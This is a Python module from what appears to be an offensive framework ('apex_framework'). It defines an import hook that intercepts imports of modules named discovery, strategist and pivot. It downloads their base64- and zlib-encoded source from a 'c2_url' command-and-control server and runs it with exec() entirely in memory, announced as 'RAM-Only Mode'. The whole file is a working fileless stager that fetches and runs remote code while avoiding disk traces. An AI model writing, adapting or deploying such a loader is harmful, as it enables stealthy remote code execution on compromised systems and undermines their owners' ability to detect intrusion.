import sys
import requests
import base64
import zlib
import types
import importlib.abc
import importlib.util
from rich.console import Console

console = Console()

class DynamicLoader(importlib.abc.MetaPathFinder, importlib.abc.Loader):
    """
    Dynamic Capability Loader (DCL).
    Intercepts imports and loads them from the Central Controller into RAM.
    """
    def __init__(self, c2_url="http://localhost:9090"):
        self.c2_url = c2_url
        self.known_modules = ["apex_framework.ops.discovery", "apex_framework.ops.strategist", "apex_framework.ops.pivot"]

    def find_spec(self, fullname, path, target=None):
        if fullname in self.known_modules:
            console.print(f"[DCL] 👻 Intercepting Import: {fullname}")
            return importlib.util.spec_from_loader(fullname, self)
        return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        short_name = module.__name__.split('.')[-1]
        console.print(f"[DCL] 📡 Streaming Logic for '{short_name}' from Controller...")

        try:
            resp = requests.get(f"{self.c2_url}/stream?module={short_name}")
            if resp.status_code == 200:
                data = resp.json()['payload']
                decoded = base64.b64decode(data)
                source_code = zlib.decompress(decoded).decode()
                console.print(f"[DCL] 🧬 Materializing '{short_name}' in Memory...")
                exec(source_code, module.__dict__)
            else:
                raise ImportError(f"Server returned {resp.status_code}")
        except Exception as e:
            console.print(f"[DCL] ❌ Stream Failed: {e}")
            raise ImportError(f"Could not stream {module.__name__}")

def install(c2_url="http://localhost:9090"):
    sys.meta_path.insert(0, DynamicLoader(c2_url))
    console.print("[DCL] 🕸️ Dynamic Loader Active. RAM-Only Mode.")
